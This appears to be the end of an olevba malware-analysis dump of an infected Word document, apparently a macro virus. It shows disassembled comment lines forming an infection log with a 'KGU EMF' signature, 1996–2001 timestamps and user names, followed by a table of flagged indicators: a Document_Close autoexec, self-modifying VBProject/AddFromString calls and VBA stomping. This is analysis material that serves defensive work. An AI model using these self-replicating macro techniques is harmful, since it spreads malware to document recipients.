' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1221:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1222:
' 	QuoteRem 0x0000 0x001E " 04:51:46 - среда, 28 авг 1996"
' Line #1223:
' 	QuoteRem 0x0000 0x0008 " Петрова"
' Line #1224:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1225:
' Line #1226:
' Line #1227:
' Line #1228:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1229:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1230:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1231:
' 	QuoteRem 0x0000 0x001E " 11:34:23 - среда, 28 авг 1996"
' Line #1232:
' 	QuoteRem 0x0000 0x0008 " Петрова"
' Line #1233:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1234:
' Line #1235:
' Line #1236:
' Line #1237:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1238:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1239:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1240:
' 	QuoteRem 0x0000 0x0020 " 08:09:07 - пятница, 30 авг 1996"
' Line #1241:
' 	QuoteRem 0x0000 0x0008 " Петрова"
' Line #1242:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1243:
' Line #1244:
' Line #1245:
' Line #1246:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1247:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1248:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1249:
' 	QuoteRem 0x0000 0x0020 " 12:06:34 - пятница, 30 авг 1996"
' Line #1250:
' 	QuoteRem 0x0000 0x0008 " Петрова"
' Line #1251:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1252:
' Line #1253:
' Line #1254:
' Line #1255:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1256:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1257:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1258:
' 	QuoteRem 0x0000 0x0020 " 21:16:10 - пятница, 30 авг 1996"
' Line #1259:
' 	QuoteRem 0x0000 0x0008 " Петрова"
' Line #1260:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1261:
' Line #1262:
' Line #1263:
' Line #1264:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1265:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1266:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1267:
' 	QuoteRem 0x0000 0x0020 " 22:37:05 - пятница, 30 авг 1996"
' Line #1268:
' 	QuoteRem 0x0000 0x0008 " Петрова"
' Line #1269:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1270:
' Line #1271:
' Line #1272:
' Line #1273:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1274:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1275:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1276:
' 	QuoteRem 0x0000 0x0020 " 05:17:41 - суббота, 31 авг 1996"
' Line #1277:
' 	QuoteRem 0x0000 0x0008 " Петрова"
' Line #1278:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1279:
' Line #1280:
' Line #1281:
' Line #1282:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1283:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1284:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1285:
' 	QuoteRem 0x0000 0x0020 " 11:27:37 - суббота, 31 авг 1996"
' Line #1286:
' 	QuoteRem 0x0000 0x0008 " Петрова"
' Line #1287:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1288:
' Line #1289:
' Line #1290:
' Line #1291:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1292:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1293:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1294:
' 	QuoteRem 0x0000 0x0020 " 22:53:03 - суббота, 31 авг 1996"
' Line #1295:
' 	QuoteRem 0x0000 0x0008 " Петрова"
' Line #1296:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1297:
' Line #1298:
' Line #1299:
' Line #1300:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1301:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1302:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1303:
' 	QuoteRem 0x0000 0x0023 " 05:03:09 - воскресенье, 1 сен 1996"
' Line #1304:
' 	QuoteRem 0x0000 0x0008 " Петрова"
' Line #1305:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1306:
' Line #1307:
' Line #1308:
' Line #1309:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1310:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1311:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1312:
' 	QuoteRem 0x0000 0x0023 " 14:58:52 - воскресенье, 1 сен 1996"
' Line #1313:
' 	QuoteRem 0x0000 0x0008 " Петрова"
' Line #1314:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1315:
' Line #1316:
' Line #1317:
' Line #1318:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1319:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1320:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1321:
' 	QuoteRem 0x0000 0x0023 " 23:51:03 - воскресенье, 1 сен 1996"
' Line #1322:
' 	QuoteRem 0x0000 0x0008 " Петрова"
' Line #1323:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1324:
' Line #1325:
' Line #1326:
' Line #1327:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1328:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1329:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1330:
' 	QuoteRem 0x0000 0x0023 " 02:24:07 - понедельник, 2 сен 1996"
' Line #1331:
' 	QuoteRem 0x0000 0x0008 " Петрова"
' Line #1332:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1333:
' Line #1334:
' Line #1335:
' Line #1336:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1337:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1338:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1339:
' 	QuoteRem 0x0000 0x0020 " 20:31:22 - суббота, 26 май 2001"
' Line #1340:
' 	QuoteRem 0x0000 0x000D " Vera Petrova"
' Line #1341:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1342:
' Line #1343:
' Line #1344:
' Line #1345:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1346:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1347:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1348:
' 	QuoteRem 0x0000 0x0020 " 20:36:14 - суббота, 26 май 2001"
' Line #1349:
' 	QuoteRem 0x0000 0x000D " Vera Petrova"
' Line #1350:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1351:
' Line #1352:
' Line #1353:
' Line #1354:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1355:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1356:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1357:
' 	QuoteRem 0x0000 0x0020 " 20:54:07 - суббота, 26 май 2001"
' Line #1358:
' 	QuoteRem 0x0000 0x000D " Vera Petrova"
' Line #1359:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1360:
' Line #1361:
' Line #1362:
' Line #1363:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1364:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1365:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1366:
' 	QuoteRem 0x0000 0x0020 " 23:06:49 - суббота, 26 май 2001"
' Line #1367:
' 	QuoteRem 0x0000 0x000D " Vera Petrova"
' Line #1368:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1369:
' Line #1370:
' Line #1371:
' Line #1372:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1373:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1374:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1375:
' 	QuoteRem 0x0000 0x0020 " 23:40:23 - суббота, 26 май 2001"
' Line #1376:
' 	QuoteRem 0x0000 0x000D " Vera Petrova"
' Line #1377:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1378:
' Line #1379:
' Line #1380:
' Line #1381:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1382:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1383:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1384:
' 	QuoteRem 0x0000 0x0020 " 23:50:37 - суббота, 26 май 2001"
' Line #1385:
' 	QuoteRem 0x0000 0x000D " Vera Petrova"
' Line #1386:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1387:
' Line #1388:
' Line #1389:
' Line #1390:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1391:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1392:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1393:
' 	QuoteRem 0x0000 0x0024 " 01:30:18 - воскресенье, 27 май 2001"
' Line #1394:
' 	QuoteRem 0x0000 0x000D " Vera Petrova"
' Line #1395:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1396:
' Line #1397:
' Line #1398:
' Line #1399:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1400:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1401:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1402:
' 	QuoteRem 0x0000 0x0024 " 19:25:06 - понедельник, 28 май 2001"
' Line #1403:
' 	QuoteRem 0x0000 0x0004 " buh"
' Line #1404:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1405:
' Line #1406:
' Line #1407:
' Line #1408:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1409:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1410:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1411:
' 	QuoteRem 0x0000 0x0020 " 15:44:49 - суббота, 29 май 1999"
' Line #1412:
' 	QuoteRem 0x0000 0x0004 " buh"
' Line #1413:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1414:
' Line #1415:
' Line #1416:
' Line #1417:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1418:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1419:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1420:
' 	QuoteRem 0x0000 0x0020 " 15:45:05 - суббота, 29 май 1999"
' Line #1421:
' 	QuoteRem 0x0000 0x0004 " buh"
' Line #1422:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1423:
' Line #1424:
' Line #1425:
' Line #1426:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1427:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1428:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1429:
' 	QuoteRem 0x0000 0x0020 " 17:54:22 - вторник, 29 май 2001"
' Line #1430:
' 	QuoteRem 0x0000 0x0007 " Камель"
' Line #1431:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1432:
' Line #1433:
' Line #1434:
' Line #1435:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1436:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1437:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1438:
' 	QuoteRem 0x0000 0x0020 " 16:50:06 - вторник, 12 июн 2001"
' Line #1439:
' 	QuoteRem 0x0000 0x000E " Гилязутдинова"
' Line #1440:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1441:
' Line #1442:
' Line #1443:
' Line #1444:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1445:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1446:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1447:
' 	QuoteRem 0x0000 0x0020 " 16:33:40 - четверг, 14 июн 2001"
' Line #1448:
' 	QuoteRem 0x0000 0x000E " Гилязутдинова"
' Line #1449:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1450:
' Line #1451:
' Line #1452:
' Line #1453:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1454:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1455:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1456:
' 	QuoteRem 0x0000 0x0024 " 10:46:19 - понедельник, 18 июн 2001"
' Line #1457:
' 	QuoteRem 0x0000 0x0002 " ."
' Line #1458:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1459:
' Line #1460:
' Line #1461:
' Line #1462:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1463:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1464:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1465:
' 	QuoteRem 0x0000 0x0024 " 19:21:56 - понедельник, 18 июн 2001"
' Line #1466:
' 	QuoteRem 0x0000 0x0002 " ."
' Line #1467:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1468:
' Line #1469:
' Line #1470:
' Line #1471:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1472:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1473:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1474:
' 	QuoteRem 0x0000 0x0020 " 10:04:00 - четверг, 21 июн 2001"
' Line #1475:
' 	QuoteRem 0x0000 0x0002 " ."
' Line #1476:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1477:
' Line #1478:
' Line #1479:
' Line #1480:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1481:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1482:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1483:
' 	QuoteRem 0x0000 0x0024 " 12:04:18 - понедельник, 25 июн 2001"
' Line #1484:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #1485:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #1486:
' Line #1487:
' Line #1488:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

